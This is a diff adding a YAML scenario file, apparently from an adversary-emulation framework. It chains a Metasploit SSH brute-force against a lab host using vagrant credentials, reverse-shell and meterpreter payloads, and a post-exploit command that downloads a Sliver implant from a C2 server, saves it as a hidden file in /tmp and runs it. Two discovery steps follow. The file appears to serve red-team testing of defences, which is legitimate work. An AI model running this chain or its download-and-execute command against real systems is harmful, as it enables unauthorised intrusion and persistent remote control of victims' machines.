@@ -1,0 +1,79 @@
+name: Metasploit Initial Access — Linux SSH Brute-Force → Discovery
+description: >
+  Demonstrates the "metasploit" initial-access module against a Linux SSH target.
+  Tries multiple exploit/payload combinations in sequence (brute-force mode):
+  sshexec with a shell payload, then sshexec with a meterpreter payload. On
+  success, a post-exploit command stages a Sliver beacon so a real session
+  appears. The captured session is then used for two quick discovery steps.
+  Requires msfconsole installed on the C2 host.
+tags:
+  - linux
+  - initial-access
+  - metasploit
+  - brute-force
+mitre_tactics:
+  - initial-access
+  - discovery
+
+targets:
+  - name: linux_ssh_target
+    host: 192.168.56.10
+    port: 22
+
+steps:
+  # ── Initial access: Metasploit SSH brute-force → Sliver beacon ──────────────
+  - id: breach_via_msf
+    name: Metasploit SSH exploit (brute-force payloads) → stage beacon (T1110)
+    action:
+      type: initial_access
+      initial_access:
+        target: linux_ssh_target
+        module: metasploit
+        config:
+          # Brute-force: try multiple MSF exploit modules in sequence.
+          # The first one that opens a session wins (stop_on_success defaults true).
+          module: '["exploit/linux/ssh/sshexec"]'
+          # Brute-force payloads: shell first, meterpreter as fallback.
+          payload: '["linux/x64/shell/reverse_tcp", "linux/x64/meterpreter/reverse_tcp"]'
+          lhost: "192.168.56.5"
+          lport: "4444"
+          # Extra MSF options (SSH credentials to try).
+          options: '{"SMBUser":"vagrant","SSH_USER":"vagrant","PASSWORD":"vagrant","THREADS":"5"}'
+          session_wait: "20"
+          # Post-exploit: download and run a Sliver implant inside the opened session.
+          post_exploit_cmd: "curl -s -o /tmp/.sysd http://192.168.56.5:8080/api/v1/implant/linux?c2=192.168.56.5 && chmod +x /tmp/.sysd && /tmp/.sysd"
+        wait:
+          timeout: "240s"
+          match_os: "linux"
+    output_var: linux_session
+    timeout: "300s"
+    on_fail: abort
+
+  # ── Post-exploitation: discovery on the breached host ───────────────────────
+  - id: sysinfo
+    name: System information discovery (T1082)
+    depends_on:
+      - breach_via_msf
+    session_id: "{{linux_session}}"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1082
+        test: 2
+    output_var: sysinfo_out
+    timeout: 30s
+    on_fail: continue
+
+  - id: net_discovery
+    name: Network configuration discovery (T1016)
+    depends_on:
+      - breach_via_msf
+    session_id: "{{linux_session}}"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1016
+        test: 2
+    output_var: net_out
+    timeout: 30s
+    on_fail: continue
